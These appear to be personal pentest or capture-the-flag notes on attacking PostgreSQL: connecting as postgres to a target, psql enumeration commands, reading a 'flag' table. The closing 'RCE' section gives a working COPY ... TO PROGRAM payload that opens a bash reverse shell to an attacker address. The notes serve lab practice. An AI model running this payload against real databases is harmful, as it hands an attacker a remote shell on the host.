
```
psql -h <target_ip> -U postgres -d <databasename>
```

List databases

```
\l  
```

Select database

```
\c <databasename>
```

Enumerate Tables

```
\dt
```

View Content of Table

```
SELECT * FROM flag;
```
##### Syntax

```
\l          -- list databases
\c secrets  -- connect to a database
\dn         -- list schemas
\dt         -- list tables in current schema
\dt *.*     -- list tables in all schemas
\dv         -- list views
\di         -- list indexes
\du         -- list roles/users
\d table_name   -- describe a table
\d+ table_name  -- describe with more detail
\?          -- help for psql meta-commands
```
##### RCE

```
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.173/5437 0>&1"';
```